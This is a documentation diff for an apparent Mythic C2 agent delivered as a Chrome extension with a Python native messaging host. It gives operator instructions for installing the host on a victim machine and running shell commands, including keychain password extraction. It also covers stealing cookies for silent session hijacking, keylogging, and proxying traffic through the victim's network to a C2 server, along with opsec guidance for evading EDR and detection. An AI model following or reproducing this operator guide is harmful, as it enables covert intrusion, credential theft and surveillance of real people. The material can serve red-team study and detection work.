+<td><code>native_start [psk=&lt;key&gt;]</code></td>
+<td>🟡</td>
+<td>Connect native host only — no SOCKS proxy. Enables file and exec commands</td>
+<td>T1059, T1083</td>
+</tr>
+<tr>
+<td><code>native_stop</code></td>
+<td>🟢</td>
+<td>Disconnect native host started by <code>native_start</code></td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>ip_proxy_start url=&lt;wss://c2/path&gt; [socks_port=1080] [psk=&lt;key&gt;]</code></td>
+<td>🟡</td>
+<td>Native host + SOCKS5 relay — proxying AND file/exec</td>
+<td>T1090.001, T1185</td>
+</tr>
+<tr>
+<td><code>ip_proxy_stop</code></td>
+<td>🟢</td>
+<td>Stop ip_proxy relay and disconnect native host</td>
+<td>T1090</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>Both <code>native_start</code> and <code>ip_proxy_start</code> create a Python subprocess as a child of Chrome — an unusual process relationship that some EDR rules flag. The native host manifest and <code>.bat</code> launcher (Windows) are written to disk at install time, not activation time.</p>
+</blockquote>
+<p><strong>Which to use:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Need</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>File access or exec only, no proxying</td>
+<td><code>native_start</code></td>
+</tr>
+<tr>
+<td>SOCKS proxy only (<code>proxy_only</code> build)</td>
+<td><code>ip_proxy_start</code></td>
+</tr>
+<tr>
+<td>SOCKS proxy + file/exec (<code>all</code> build)</td>
+<td><code>ip_proxy_start</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="file-system-native-host">File System (Native Host)<a class="headerlink" href="#file-system-native-host" title="Permanent link">&para;</a></h3>
+<p><em>Requires native host with <code>files</code> or <code>all</code> feature, and <code>native_start</code> or <code>ip_proxy_start</code> active.</em></p>
+<p><strong>Backend:</strong> All file commands run entirely in Python's standard library — <code>os</code>, <code>stat</code>, <code>base64</code>. No shell, no subprocess, no Win32 API calls. They map directly to OS kernel syscalls via Python's C extensions:</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Noise</th>
+<th>Python call</th>
+<th>Syscall</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>file_ls path=&lt;dir&gt;</code></td>
+<td>🟢</td>
+<td><code>os.listdir()</code> + <code>os.stat()</code> per entry</td>
+<td><code>readdir()</code> + <code>stat()</code></td>
+</tr>
+<tr>
+<td><code>file_download path=&lt;file&gt;</code></td>
+<td>🟡</td>
+<td><code>open(path,'rb').read()</code> in 384 KB chunks</td>
+<td><code>open()</code> + <code>read()</code></td>
+</tr>
+<tr>
+<td><code>file_upload path=&lt;dest&gt; file_id=&lt;id&gt;\|content_b64=&lt;b64&gt;</code></td>
+<td>🟡</td>
+<td><code>open(path,'wb').write()</code> per chunk</td>
+<td><code>open()</code> + <code>write()</code></td>
+</tr>
+<tr>
+<td><code>file_delete path=&lt;file&gt;</code></td>
+<td>🔴</td>
+<td><code>os.remove()</code> / <code>os.rmdir()</code></td>
+<td><code>unlink()</code> / <code>rmdir()</code></td>
+</tr>
+<tr>
+<td><code>file_mkdir path=&lt;dir&gt;</code></td>
+<td>🟡</td>
+<td><code>os.makedirs()</code></td>
+<td><code>mkdir()</code> recursive</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Chunked transfer:</strong> Chrome's native messaging has a hard <strong>1 MB per-message limit</strong>. Files larger than ~750 KB would silently fail without chunking. Both download and upload split transfers into 384 KB raw chunks (~512 KB base64), well under the limit:</p>
+<ul>
+<li><strong>Download:</strong> native host reads chunks sequentially and emits one message per chunk with <code>chunk_num</code> / <code>total_chunks</code>. The extension accumulates all chunks and joins them before sending to Mythic.</li>
+<li><strong>Upload:</strong> the extension splits the base64 data into chunks and sends them sequentially. The first chunk opens the file with <code>wb</code> (create/overwrite); subsequent chunks use <code>ab</code> (append). The native host's existing append logic handles this with no additional changes.</li>
+</ul>
+<blockquote>
+<p><code>file_ls</code> output includes permissions, size, and <strong>last-modified timestamp</strong> (UTC). <code>file_download</code> reads the file in place — accessing sensitive paths (SSH keys, browser databases, <code>/etc/shadow</code>) will be logged by file access auditing on hardened hosts. <code>file_upload</code> writing to startup directories or executable paths triggers most EDRs. <code>file_delete</code> creates a forensic gap and should be used carefully.</p>
+</blockquote>
+<h3 id="shell-execution-native-host">Shell Execution (Native Host)<a class="headerlink" href="#shell-execution-native-host" title="Permanent link">&para;</a></h3>
+<p><em>Requires native host with <code>exec</code> or <code>all</code> feature, and <code>native_start</code> or <code>ip_proxy_start</code> active.</em></p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Noise</th>
+<th>Description</th>
+<th>ATT&amp;CK</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>exec &lt;command&gt;</code></td>
+<td>🟢–🔴</td>
+<td>Execute a command via native host (noise depends on mode — see below)</td>
+<td>T1059</td>
+</tr>
+</tbody>
+</table>
+<p><code>exec</code> parameters (JSON or plain string):</p>
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Default</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cmd</code></td>
+<td><em>(required)</em></td>
+<td>Command to run, or Python code for <code>mode=python</code></td>
+</tr>
+<tr>
+<td><code>mode</code></td>
+<td><code>direct</code></td>
+<td><code>direct</code> / <code>python</code> / <code>shell</code> — see table below</td>
+</tr>
+<tr>
+<td><code>cwd</code></td>
+<td><em>(native host dir)</em></td>
+<td>Working directory</td>
+</tr>
+<tr>
+<td><code>timeout</code></td>
+<td><code>60</code></td>
+<td>Seconds before kill</td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>exec</code> mode — opsec comparison:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Mode</th>
+<th>Noise</th>
+<th>How it works</th>
+<th>Process tree</th>
+<th>Shell features</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>python</code></td>
+<td>🟢</td>
+<td><code>exec()</code> inside native host process — no fork, no subprocess</td>
+<td>None — runs in native host memory</td>
+<td>Python only — no shell syntax</td>
+</tr>
+<tr>
+<td><code>direct</code> <em>(default)</em></td>
+<td>🟡</td>
+<td><code>shlex.split(cmd)</code> → <code>subprocess.run(shell=False)</code> → OS <code>execve()</code></td>
+<td><code>proxy_host.py</code> → <code>whoami</code></td>
+<td>Simple commands only — no <code>\|</code>, <code>&gt;</code>, <code>&amp;&amp;</code>, globs</td>
+</tr>
+<tr>
+<td><code>shell</code></td>
+<td>🔴</td>
+<td><code>/bin/sh -c cmd</code> (Unix) or <code>cmd.exe /c cmd</code> (Windows)</td>
+<td><code>proxy_host.py</code> → <code>/bin/sh</code> → <code>whoami</code></td>
+<td>Full shell — pipes, redirects, all shell syntax</td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>direct</code> mode:</strong> <code>shlex.split</code> tokenises the string as a POSIX shell would parse a single command — <code>"ls -la /tmp"</code> → <code>["ls", "-la", "/tmp"]</code> — then calls <code>execve()</code> directly. No shell exists in the process tree. Cannot use pipes, redirects, wildcards, or chained commands; use <code>mode=shell</code> only when those features are required and the added EDR visibility is acceptable.</p>
+<p><strong>Windows path escaping in <code>mode=python</code>:</strong> JSON decodes <code>\\</code> to a single <code>\</code> before the code reaches Python. Python then interprets <code>\U</code>, <code>\u</code>, <code>\N</code> etc. as Unicode escape sequences, causing <code>unicodeescape</code> errors on paths like <code>C:\Users</code>. The native host auto-detects this and normalises backslashes in string literals that look like Windows paths (<code>X:\...</code>). You can also avoid the issue entirely by using forward slashes (<code>C:/Users/...</code>) or raw strings (<code>r'C:\Users\...'</code>).</p>
+<p><strong><code>python</code> mode examples</strong> (zero subprocess overhead):</p>
+<pre><code>exec {&quot;cmd&quot;: &quot;import socket; print(socket.gethostname())&quot;, &quot;mode&quot;: &quot;python&quot;}
+exec {&quot;cmd&quot;: &quot;import os; print(os.listdir('/tmp'))&quot;, &quot;mode&quot;: &quot;python&quot;}
+exec {&quot;cmd&quot;: &quot;import subprocess; r=subprocess.run(['id'],capture_output=True); print(r.stdout.decode())&quot;, &quot;mode&quot;: &quot;python&quot;}
+</code></pre>
+<p><strong><code>direct</code> mode examples:</strong></p>
+<pre><code>exec whoami
+exec {&quot;cmd&quot;: &quot;security find-generic-password -wa Chrome&quot;, &quot;mode&quot;: &quot;direct&quot;}
+exec {&quot;cmd&quot;: &quot;netstat -an&quot;, &quot;mode&quot;: &quot;direct&quot;}
+</code></pre>
+<p><strong><code>shell</code> mode examples</strong> (use only when pipes/redirects are needed):</p>
+<pre><code>exec {&quot;cmd&quot;: &quot;cat /etc/hosts | grep -v localhost&quot;, &quot;mode&quot;: &quot;shell&quot;}
+exec {&quot;cmd&quot;: &quot;find /Users -name '*.plist' 2&gt;/dev/null | head -20&quot;, &quot;mode&quot;: &quot;shell&quot;}
+</code></pre>
+<hr />
+<h2 id="9-native-messaging-host">9. Native Messaging Host<a class="headerlink" href="#9-native-messaging-host" title="Permanent link">&para;</a></h2>
+<p>The native messaging host (<code>proxy_host.py</code>) extends the extension with OS-level capabilities: outbound TCP relay for SOCKS proxying, filesystem access, and arbitrary command execution.</p>
+<h3 id="build-time-feature-selection">Build-time feature selection<a class="headerlink" href="#build-time-feature-selection" title="Permanent link">&para;</a></h3>
+<p>The <code>native_host_features</code> build parameter controls what code is compiled into the host. Choose <code>none</code> for an extension-only payload (no native host files in the ZIP, no disk artefacts). For any other choice the ZIP includes <code>native_host/proxy_host.py</code> (encrypted bootstrap) and <code>native_host/install.py</code>.</p>
+<h3 id="installation-on-victim">Installation on victim<a class="headerlink" href="#installation-on-victim" title="Permanent link">&para;</a></h3>
+<p><strong>Step 1</strong> — Extract the ZIP on the victim machine.</p>
+<p><strong>Step 2</strong> — Run the installer with the extension ID (found in Mythic callback Domain field).</p>
+<h4 id="macos-linux">macOS / Linux<a class="headerlink" href="#macos-linux" title="Permanent link">&para;</a></h4>
+<pre><code class="language-bash">python3 native_host/install.py --extension-id &lt;32-char-id&gt;
+</code></pre>
+<p>The installer embeds the absolute Python path in the file's shebang so Chrome can find it even with a stripped PATH. No shell wrapper is created.</p>
+<h4 id="windows">Windows<a class="headerlink" href="#windows" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p><strong>Windows Store Python warning.</strong> The stub at <code>AppData\Local\Microsoft\WindowsApps\python3.exe</code> is <strong>not</strong> a real interpreter — it opens the Microsoft Store when invoked non-interactively. Chrome will silently fail to start the native host with no visible error. The installer detects this and warns you, but the fix is to use a real Python.</p>
+</blockquote>
+<p><strong>Step 2a</strong> — Confirm you have a real Python installed from <a href="https://python.org">python.org</a>. Look for it at a path like:</p>
+<pre><code>C:\Users\&lt;you&gt;\AppData\Local\Programs\Python\Python312\python.exe
+C:\Python312\python.exe
+</code></pre>
+<p><strong>Step 2b</strong> — Run the installer, specifying the real Python explicitly:</p>
+<pre><code class="language-cmd">python native_host\install.py ^
+    --extension-id &lt;32-char-id&gt; ^
+    --python &quot;C:\Users\&lt;you&gt;\AppData\Local\Programs\Python\Python312\python.exe&quot;
+</code></pre>
+<p>The installer detects which launcher type is present in the ZIP directory and configures accordingly:</p>
+<p><strong>With <code>go_launcher</code> (recommended):</strong> A pre-compiled <code>.exe</code> with a randomised name (e.g. <code>chrome_helper.exe</code>) is present in the ZIP. The installer writes <code>launcher.cfg</code> with the detected Python path and points the manifest at the <code>.exe</code>.</p>
+<p><strong>Without <code>go_launcher</code> (fallback):</strong> The installer creates a VBScript <code>.vbs</code> launcher. This avoids <code>cmd.exe</code> but still routes through <code>wscript.exe</code>.</p>
+<table>
+<thead>
+<tr>
+<th>Launcher type</th>
+<th>Process tree</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Go launcher (<code>go_launcher</code> build)</td>
+<td><code>Chrome → chrome_helper.exe → python.exe (signed)</code></td>
+</tr>
+<tr>
+<td>VBScript fallback</td>
+<td><code>Chrome → wscript.exe → python.exe (signed)</code></td>
+</tr>
+</tbody>
+</table>
+<p>The native messaging manifest is written to JSON and registered in the Windows registry at:</p>
+<pre><code>HKCU\SOFTWARE\Google\Chrome\NativeMessagingHosts\&lt;host-name&gt;
+</code></pre>
+<p>The registry value (Default) is the <strong>path to the manifest JSON file</strong> — not the executable directly. Expand the tree in <code>regedit</code> fully to <code>NativeMessagingHosts\&lt;host-name&gt;</code> to see it.</p>
+<p>If the installer prints a Store Python warning, install Python from python.org and re-run with <code>--python</code>.</p>
+<h4 id="verify-the-install">Verify the install<a class="headerlink" href="#verify-the-install" title="Permanent link">&para;</a></h4>
+<p><strong>With Go launcher:</strong></p>
+<pre><code>[+] Launcher : C:\...\chrome_helper.exe  (pre-compiled Go launcher)
+    Config   : C:\...\launcher.cfg
+    Process tree: Chrome → launcher.exe → python.exe (signed)
+[+] Manifest : C:\...\com.apple.desktop.agent.json
+[+] Registry : HKCU\SOFTWARE\Google\Chrome\NativeMessagingHosts\com.apple.desktop.agent
+</code></pre>
+<p><strong>With VBScript fallback:</strong></p>
+<pre><code>[+] Launcher : C:\...\desktop_agent.vbs  (wscript.exe; no launcher.exe found in ZIP)
+    Process tree: Chrome → wscript.exe → python.exe (signed)
+[+] Manifest : C:\...\com.apple.desktop.agent.json
+[+] Registry : HKCU\SOFTWARE\Google\Chrome\NativeMessagingHosts\com.apple.desktop.agent
+</code></pre>
+<p><strong>Step 3</strong> — For <code>proxy_host_level=standard</code> builds the PSK is shown in the Mythic build output. Copy it before closing the build window:</p>
+<pre><code>Native host PSK (copy before closing this window): a3f9c1e2b4d6e8f0...
+</code></pre>
+<p>Use this PSK with whichever activation command applies:</p>
+<pre><code># No proxy needed (exec_only / files_only / files_and_exec build):
+native_start psk=a3f9c1e2b4d6e8f0...
+
+# With SOCKS proxy (proxy_only / proxy_and_exec / all build):
+ip_proxy_start url=wss://&lt;c2&gt;/proxy-ws psk=a3f9c1e2b4d6e8f0...
+</code></pre>
+<p>For <code>proxy_host_level=none</code> builds the installer generates the PSK itself and prints it at the end of its output.</p>
+<h3 id="uninstall">Uninstall<a class="headerlink" href="#uninstall" title="Permanent link">&para;</a></h3>
+<p><strong>macOS / Linux:</strong></p>
+<pre><code class="language-bash">python3 native_host/install.py --extension-id &lt;id&gt; --uninstall
+</code></pre>
+<p><strong>Windows:</strong></p>
+<pre><code class="language-cmd">python native_host\install.py --extension-id &lt;id&gt; --uninstall
+</code></pre>
+<hr />
+<h2 id="10-ip-proxy">10. IP Proxy<a class="headerlink" href="#10-ip-proxy" title="Permanent link">&para;</a></h2>
+<p><code>ip_proxy_start</code> turns the victim's Chrome into a SOCKS5 exit node. All TCP connections made by the operator's browser emerge from the victim's IP and network.</p>
+<h3 id="step-1-start-the-infrastructure">Step 1 — Start the infrastructure<a class="headerlink" href="#step-1-start-the-infrastructure" title="Permanent link">&para;</a></h3>
+<pre><code class="language-bash"># On the C2 server
+python3 server/socks_bridge.py
+
+# In Mythic
+ip_proxy_start url=wss://your-c2.com/proxy-ws psk=&lt;psk-from-build&gt;
+</code></pre>
+<h3 id="step-2-launch-the-operator-browser">Step 2 — Launch the operator browser<a class="headerlink" href="#step-2-launch-the-operator-browser" title="Permanent link">&para;</a></h3>
+<p>Launch a dedicated Chrome instance pointed at the SOCKS proxy:</p>
+<pre><code class="language-bash"># SSH tunnel — SOCKS only
+ssh -L 1080:127.0.0.1:1080 user@c2-server
+
+# Get victim's User-Agent from bridge startup log:
+#   Registered: d2fbb215  v=4.8.6  ua=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 ...
+
+open -na &quot;Google Chrome&quot; --args \
+    --user-data-dir=&quot;/tmp/chrome-proxy&quot; \
+    --proxy-server=&quot;socks5://127.0.0.1:1080&quot; \
+    --proxy-bypass-list=&quot;&lt;-loopback&gt;&quot; \
+    --user-agent=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&quot;
+</code></pre>
+<p>Use <code>--proxy-bypass-list="&lt;-loopback&gt;"</code> to route loopback connections through the proxy. Use FoxyProxy in your normal Chrome profile to selectively route specific domains without a dedicated Chrome instance.</p>
+<h3 id="user-agent-matching">User-Agent matching<a class="headerlink" href="#user-agent-matching" title="Permanent link">&para;</a></h3>
+<p>The operator Chrome sends its own <code>User-Agent</code> header to every website visited. This header is <strong>not</strong> proxied from the victim — it reveals the operator's OS and Chrome version. To match the victim:</p>
+<ol>
+<li>Find the victim's UA in the bridge startup log: <code>Registered: &lt;id&gt;  v=&lt;ver&gt;  ua=Mozilla/5.0 ...</code></li>
+<li>Pass the full UA string to <code>--user-agent</code> in your Chrome launch command (as shown above)</li>
+</ol>
+<blockquote>
+<p><strong>Note:</strong> <code>Sec-CH-UA</code> client hint headers reflect the actual binary version of Chrome and are not fully controlled by <code>--user-agent</code>. Use a Chrome version close to the victim's to minimise discrepancy.</p>
+</blockquote>
+<h3 id="silent-login-no-victim-prompt">Silent login (no victim prompt)<a class="headerlink" href="#silent-login-no-victim-prompt" title="Permanent link">&para;</a></h3>
+<p>If the victim has an active session, steal their cookies first:</p>
+<pre><code># In Mythic
+dump_cookies
+# or
+session_export https://&lt;target.example.com&gt;
+</code></pre>
+<p>Import the cookies into the operator browser before navigating to the target. The existing session means no new authentication challenge fires and the victim receives no notification.</p>
+<blockquote>
+<p><strong>DBSC note:</strong> Google services (Gmail, Drive) use Device-Bound Session Credentials (DBSC), which cryptographically bind sessions to the victim's device keys. Stolen cookies alone are not sufficient for DBSC-protected sessions from a different browser. Use <code>download_url</code> or <code>inject_tab</code> via the Hades extension to access Google resources through the victim's own Chrome instead.</p>
+</blockquote>
+<hr />
+<h2 id="11-push-vs-poll-when-it-matters">11. Push vs Poll -- When It Matters<a class="headerlink" href="#11-push-vs-poll-when-it-matters" title="Permanent link">&para;</a></h2>
+<h3 id="how-it-works">How it works<a class="headerlink" href="#how-it-works" title="Permanent link">&para;</a></h3>
+<p>Both WebSocket and HTTP are <strong>poll-based</strong> -- the agent sends <code>get_tasking</code> at the sleep<br />
+interval. Mythic's WebSocket C2 profile is request-response over a persistent connection,<br />
+not true server-push. The key difference is connection efficiency:</p>
+<ul>
+<li><strong>WebSocket</strong>: The socket stays open between polls. Each <code>get_tasking</code> is a message on<br />
+  the existing connection -- no TCP/TLS handshake overhead. Lower latency per poll, less<br />
+  conspicuous than repeated HTTP connections.</li>
+<li><strong>HTTP</strong>: Each poll is a fresh HTTP POST. Higher per-request overhead but simpler network<br />
+  profile (looks like normal web requests).</li>
+<li><strong>Outbound data</strong> (responses, files, real-time notifications) is always sent immediately<br />
+  in both modes.</li>
+</ul>
+<h3 id="transport-comparison">Transport comparison<a class="headerlink" href="#transport-comparison" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>WebSocket</th>
+<th>HTTP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Task delivery</td>
+<td>Polls on <code>sleepIntervalMs</code></td>
+<td>Polls on <code>sleepIntervalMs</code></td>
+</tr>
+<tr>
+<td>Idle traffic pattern</td>
+<td>Periodic messages on open socket</td>
+<td>Periodic HTTP POSTs</td>
+</tr>
+<tr>
+<td>Per-poll overhead</td>
+<td>~100 bytes (WS frame)</td>
+<td>Full HTTP request + TLS</td>
+</tr>
+<tr>
+<td>Outbound responses</td>
+<td>Immediate</td>
+<td>Immediate</td>
+</tr>
+<tr>
+<td>Connection overhead</td>
+<td>One persistent socket</td>
+<td>New connection per cycle</td>
+</tr>
+<tr>
+<td>Reconnect on wake</td>
+<td>Automatic (alarm + ensureConnected)</td>
+<td>Automatic</td>
+</tr>
+</tbody>
+</table>
+<h3 id="recommendations">Recommendations<a class="headerlink" href="#recommendations" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>WebSocket</strong> for lower overhead and faster round-trips. Best when the C2 domain has<br />
+  WebSocket-compatible infrastructure (reverse proxy, CDN).</li>
+<li><strong>HTTP</strong> when WebSocket is blocked or when the traffic pattern of periodic HTTP requests<br />
+  blends better with the target environment.</li>
+<li>Keep <code>sleep</code> at 5--10 s for responsive operations. Longer intervals (60 s, 5 min, etc.)<br />
+  are fully supported — the service worker stays alive via a separate silent keepalive<br />
+  timer (20 s <code>chrome.storage.local</code> write, zero network traffic). Avoid sub-3 s intervals<br />
+  as they generate conspicuous polling traffic.</li>
+</ul>
+<hr />
+<h2 id="12-opsec-recommendations">12. Opsec Recommendations<a class="headerlink" href="#12-opsec-recommendations" title="Permanent link">&para;</a></h2>
+<h3 id="extension-delivery">Extension delivery<a class="headerlink" href="#extension-delivery" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Developer mode extensions show a visible banner and may be blocked by enterprise policy.<br />
+  For stealth, deploy via group policy (<code>ExtensionInstallForcelist</code>) or enterprise Chrome<br />
+  management.</li>
+<li>The extension's name and description are randomised at build time (or set by the<br />
+  operator). No static IOCs like "Hades" appear in the delivered zip.</li>
+</ul>
+<h3 id="c2-traffic">C2 traffic<a class="headerlink" href="#c2-traffic" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Use <code>wss://</code> / <code>https://</code> with a valid TLS certificate on a clean-reputation domain.</li>
+<li>The <code>User-Agent</code> is Chrome's native UA -- traffic blends with normal browsing.</li>
+<li>Use port <code>443</code>. Avoid <code>8080</code>, <code>4444</code>, etc.</li>
+<li>WebSocket push mode produces zero idle traffic. HTTP poll creates a periodic pattern.</li>
+<li>The C2 URL is embedded in the payload. If the extension is obtained from disk, the<br />
+  infrastructure is exposed. Rotate domains between operations.</li>
+</ul>
+<h3 id="sleep-interval-http-only">Sleep interval (HTTP only)<a class="headerlink" href="#sleep-interval-http-only" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Default: 10 s. Reasonable for most operations.</li>
+<li>Very short intervals (&lt; 3 s) produce noticeable polling that UEBA tools may flag.</li>
+<li>The current heartbeat does not jitter. For higher opsec, add random jitter in code.</li>
+<li>WebSocket mode does not poll at all -- the sleep interval is irrelevant.</li>
+</ul>
+<h3 id="crypto-and-key-exposure">Crypto and key exposure<a class="headerlink" href="#crypto-and-key-exposure" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>PSK mode</strong> (<code>encrypted_exchange_check = false</code>): a static AES-256 key is embedded in<br />
+  the payload. If the <code>.zip</code> is captured, all traffic is decryptable.</li>
+<li><strong>EKE mode</strong> (<code>encrypted_exchange_check = true</code>, recommended): only the RSA public key<br />
+  is embedded. Session keys are negotiated at runtime and never touch disk. Even if the<br />
+  payload is captured, traffic cannot be decrypted without Mythic's RSA private key.</li>
+<li>With obfuscation enabled, crypto constants are buried in RC4-encoded string arrays and<br />
+  control flow. Obfuscation is not encryption but raises extraction effort. Use EKE to<br />
+  make key extraction irrelevant.</li>
+</ul>
+<h3 id="sensitive-commands">Sensitive commands<a class="headerlink" href="#sensitive-commands" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>session_export</code> and <code>local_storage</code> produce files with tokens and potentially plaintext credentials. Limit operator access.</li>
+<li><code>network_monitor_start</code> captures all HTTP traffic including auth headers. Stop promptly.</li>
+<li><code>download_intercept_start</code> is visible to the user (original download disappears).</li>
+<li><code>keylog</code> buffers accumulate in memory. Keep sessions short.</li>
+<li><code>native_start</code> / <code>ip_proxy_start</code> install a native messaging host which is visible in Chrome's subprocess list and may be flagged by EDR.</li>
+</ul>
+<h3 id="command-opsec-reference">Command opsec reference<a class="headerlink" href="#command-opsec-reference" title="Permanent link">&para;</a></h3>
+<p>The table below rates each command by its operational noise level.</p>
+<p><strong>Legend:</strong> 🟢 Low — no new processes, no disk writes, invisible to user  /  🟡 Medium — detectable by monitoring tools or mildly visible  /  🔴 High — creates processes, writes disk, visible to user or security tooling</p>
+<h4 id="extension-only-commands-no-native-host-required">Extension-only commands (no native host required)<a class="headerlink" href="#extension-only-commands-no-native-host-required" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Noise</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sleep</code>, <code>uptime</code>, <code>idle</code></td>
+<td>🟢</td>
+<td>No I/O</td>
+</tr>
+<tr>
+<td><code>sysinfo</code></td>
+<td>🟢</td>
+<td>Reads browser internals only</td>
+</tr>
+<tr>
+<td><code>screenshot</code>, <code>screenshot_all</code></td>
+<td>🟢</td>
+<td>Tab capture, no disk write</td>
+</tr>
+<tr>
+<td><code>dump_cookies</code>, <code>dump_tabs</code></td>
+<td>🟢</td>
+<td>Reads Chrome stores</td>
+</tr>
+<tr>
+<td><code>history</code>, <code>bookmarks</code></td>
+<td>🟢</td>
+<td>Reads Chrome stores</td>
+</tr>
+<tr>
+<td><code>local_storage</code>, <code>session_export</code></td>
+<td>🟢</td>
+<td>Reads browser memory</td>
+</tr>
+<tr>
+<td><code>find_in_dom</code></td>
+<td>🟢</td>
+<td>DOM search</td>
+</tr>
+<tr>
+<td><code>clipboard</code></td>
+<td>🟢</td>
+<td>Single read, no persistence</td>
+</tr>
+<tr>
+<td><code>list_extensions</code>, <code>list_pwas</code>, <code>check_permissions</code>, <code>notifications</code></td>
+<td>🟢</td>
+<td>Read-only</td>
+</tr>
+<tr>
+<td><code>download_url</code></td>
+<td>🟡</td>
+<td>Network request logged server-side</td>
+</tr>
+<tr>
+<td><code>inject_tab</code></td>
+<td>🟡</td>
+<td>Victim sees browser navigate</td>
+</tr>
+<tr>
+<td><code>network_monitor_start</code></td>
+<td>🟡</td>
+<td>Installs webRequest listener; stop promptly</td>
+</tr>
+<tr>
+<td><code>download_history</code></td>
+<td>🟢</td>
+<td>Reads Chrome history</td>
+</tr>
+<tr>
+<td><code>download_watch</code></td>
+<td>🟢</td>
+<td>Passive listener</td>
+</tr>
+<tr>
+<td><code>download_intercept_start</code></td>
+<td>🔴</td>
+<td>Victim notices replaced file</td>
+</tr>
+<tr>
+<td><code>keylog</code></td>
+<td>🟡</td>
+<td>Content script injection; AV may flag DOM hooking</td>
+</tr>
+<tr>
+<td><code>autofill</code></td>
+<td>🟡</td>
+<td>Reads form autofill data</td>
+</tr>
+<tr>
+<td><code>webcam</code>, <code>geolocation</code></td>
+<td>🟡</td>
+<td>Requires active page permission</td>
+</tr>
+<tr>
+<td><code>exit</code></td>
+<td>🟢</td>
+<td>Silent uninstall</td>
+</tr>
+</tbody>
+</table>
+<h4 id="native-host-commands">Native host commands<a class="headerlink" href="#native-host-commands" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Noise</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>native_start</code></td>
+<td>🟡</td>
+<td>Spawns Python subprocess from Chrome; process chain depends on <code>windows_launcher</code> build option</td>
+</tr>
+<tr>
+<td><code>ip_proxy_start</code></td>
+<td>🟡</td>
+<td>Same as above plus outbound WSS connection</td>
+</tr>
+<tr>
+<td><code>file_ls</code></td>
+<td>🟢</td>
+<td>Read-only directory listing</td>
+</tr>
+<tr>
+<td><code>file_download</code></td>
+<td>🟡</td>
+<td>Disk read; Spotlight/filesystem monitors may log access</td>
+</tr>
+<tr>
+<td><code>file_upload</code></td>
+<td>🟡</td>
+<td>Disk write; creates/modifies files</td>
+</tr>
+<tr>
+<td><code>file_delete</code></td>
+<td>🔴</td>
+<td>Destructive; creates forensic gap</td>
+</tr>
+<tr>
+<td><code>file_mkdir</code></td>
+<td>🟡</td>
+<td>Disk write</td>
+</tr>
+<tr>
+<td><code>exec mode=python</code></td>
+<td>🟢</td>
+<td>No subprocess; runs inside native host process — most opsec-safe exec mode</td>
+</tr>
+<tr>
+<td><code>exec mode=direct</code></td>
+<td>🟡</td>
+<td>Direct <code>execve()</code> — no shell in process tree, but child process visible to EDR</td>
+</tr>
+<tr>
+<td><code>exec mode=shell</code></td>
+<td>🔴</td>
+<td>Shell process (<code>/bin/sh</code> or <code>cmd.exe</code>) spawned from Python; classic malicious pattern flagged by most EDRs</td>
+</tr>
+</tbody>
+</table>
+<h4 id="exec-mode-selection-guide"><code>exec</code> mode selection guide<a class="headerlink" href="#exec-mode-selection-guide" title="Permanent link">&para;</a></h4>
+<p>Use <code>mode=python</code> when the task can be expressed as Python — it runs entirely within the native host process with no new process creation:</p>
+<pre><code>exec {&quot;cmd&quot;: &quot;import socket; print(socket.gethostname())&quot;, &quot;mode&quot;: &quot;python&quot;}
+exec {&quot;cmd&quot;: &quot;import os; print(os.listdir('/tmp'))&quot;, &quot;mode&quot;: &quot;python&quot;}
+</code></pre>
+<p>Use <code>mode=direct</code> for simple OS binaries when Python won't do — binary exec'd directly, no shell wrapper:</p>
+<pre><code>exec whoami
+exec {&quot;cmd&quot;: &quot;id -un&quot;, &quot;mode&quot;: &quot;direct&quot;}
+exec {&quot;cmd&quot;: &quot;security find-certificate -a&quot;, &quot;mode&quot;: &quot;direct&quot;}
+</code></pre>
+<p>Use <code>mode=shell</code> only when shell features (pipes, redirects, wildcards) are truly required — accept the added EDR visibility:</p>
+<pre><code>exec {&quot;cmd&quot;: &quot;cat /etc/hosts | grep -v localhost&quot;, &quot;mode&quot;: &quot;shell&quot;}
+exec {&quot;cmd&quot;: &quot;find /Users -name '*.plist' 2&gt;/dev/null&quot;, &quot;mode&quot;: &quot;shell&quot;}
+</code></pre>
+<hr />
+<h2 id="13-encryption-key-modes">13. Encryption &amp; Key Modes<a class="headerlink" href="#13-encryption-key-modes" title="Permanent link">&para;</a></h2>
+<p>All agent traffic uses two protection layers:</p>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Mechanism</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Transport</td>
+<td>TLS (<code>wss://</code> / <code>https://</code>)</td>
+</tr>
+<tr>
